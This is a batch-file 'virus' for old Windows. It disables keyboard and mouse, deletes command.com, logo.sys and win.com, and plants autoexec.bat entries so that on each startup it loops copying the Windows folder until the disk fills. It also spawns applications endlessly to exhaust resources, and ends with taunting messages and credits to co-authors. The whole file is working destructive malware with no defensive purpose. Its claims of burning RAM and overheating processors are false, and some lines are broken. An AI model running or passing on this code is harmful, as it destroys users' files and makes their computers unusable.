@echo off
C:\windows\rundll32 keyboard,disable
c:\windows\rundll32 mouse,disable
goto RAMburner


:RAMburner
rem This will burnt ur ram to liquid chips...hehe...
cd\
echo device=c:\windows\ASPI2HLP.SYS>> c:\config.sys
echo device=c:\windows\DBLBUFF.SYS >> c:\config.sys
echo devicehigh=c:\windows\RAMDRIVE.SYS 40000 512 64 >> c:\config.sys
echo devicehigh=c:\windows\command\ansi.sys >> c:\config.sys
echo devicehigh=c:\windows\command\country.sys >> c:\config.sys
echo devicehigh=c:\windows\command\ebd\ASPI2DOS.SYS >> c:\config.sys
echo devicehigh=c:\windows\command\ebd\ASPI4DOS.SYS >> c:\config.sys
echo devicehigh=c:\windows\command\ebd\ASPI8DOS.SYS >> c:\config.sys
echo devicehigh=c:\windows\command\ebd\ASPI8U2.SYS >> c:\config.sys
echo devicehigh=c:\windows\command\ebd\ASPICD.SYS >> c:\config.sys
echo devicehigh=c:\windows\command\ebd\FLASHPT.SYS >> c:\config.sys
echo devicehigh=c:\windows\command\ebd\WINBOOT.SYS >> c:\config.sys
echo devicehigh=c:\windows\command\ebd\IO.SYS >> c:\config.sys
echo devicehigh=c:\windows\command\ebd\OAKCDROM.SYS >> c:\config.sys
echo devicehigh=c:\windows\command\ebd\BTCDROM.SYS >> c:\config.sys
echo smartdrv >> c:\autoexec.bat
goto justINcase


:justINcase
rem This part is just in case when u restart ur com... the virus will
rem continue from where it stopped and will keep on destroying
rem ur com on startup.
cd\
del logo.sys
del command.com
rem From here, i will destroy ur harddisk by filling up ur HDD space.
rem when u see this msg, u will have a erge to shutdown ur com again.
rem but, when u switch off ur com, ur HDD is still active, it will coz
rem ur com to have bad sector...hehe...enjoy....
echo @echo off >> c:\urmama.bat
echo echo Continuing to burn ur harddisk... >> c:\urmama.bat
echo echo Coz u restart ur com, which i ask u not to >> c:\urmama.bat
echo echo i decided to destroy ur com...coz ur NAUGHTY!!! >> c:\urmama.bat
echo echo but if u dun switch off ur com...it will not be destroyed... >> c:\urmama.bat
echo echo Please wait while we undo the changes made to ur com... we are fixing ur com
echo cd\ >> c:\urmama.bat
echo md c:\HaHaHa >> c:\urmama.bat
echo del c:\windows\win.com >> c:\autoexec.bat
echo goto :HDDspace >> c:\urmama.bat
echo :HDDspace >> c:\urmama.ba
echo c:\windows\command\xcopy c:\windows c:\HaHaHa /e/c/q/h >> c:\urmama.bat
echo goto :HDDspace >> c:\urmama.bat
echo c:\urmama.bat >> c:\autoexec.bat
goto intro

:intro
cd\
echo c:\windows\rundll32 keyboard,disable >> c:\autoexec.bat
echo c:\windows\rundll32 mouse,disable >> c:\autoexec.bat
c:\windows\smartdrv
echo Hellow! Welcome to my LiTTLe virus program...
echo.
echo This is just to warn that ur com will be busted and burned
echo in less than 20 seconds. you can try switching off ur com...
echo.
echo But i can tell u that it won't work. It will only make the situation
echo worst.....so...just wait for 30 seconds...ur com might be saved....
echo if ur a good guy.....
choice /ty,5 >nul
goto ProBurner

:ProBurner
rem This is the fun part of processor burner. ur processor will
rem the temperture of 72 degree cel...if ur com has no fan...
rem this is the end...hehe...i hope u enjoy my little virus...
goto ProcessBurn


:ProcessBurn
start notepad
start paint
start winword
start winword
goto BurnAgain

:BurnAgain
start notepad
start paint
start winword
start winword
goto ProcessBurn

:credits
echo foxpro2118 - thx for editing my virus and making it more
echo              powerful....thx for that!
echo.
echo Bug        - thx for suggesting the "close program" thinging
echo              under the regedit...thx!
echo.
echo Manitou    - I also dun know why i had two loops...haha...
echo.
echo alex323    - Hey! maybe there was only a little mistakes....
echo.
echo The owner of the infected com - for opening my virus to infect
echo ur com...hey..thx for that!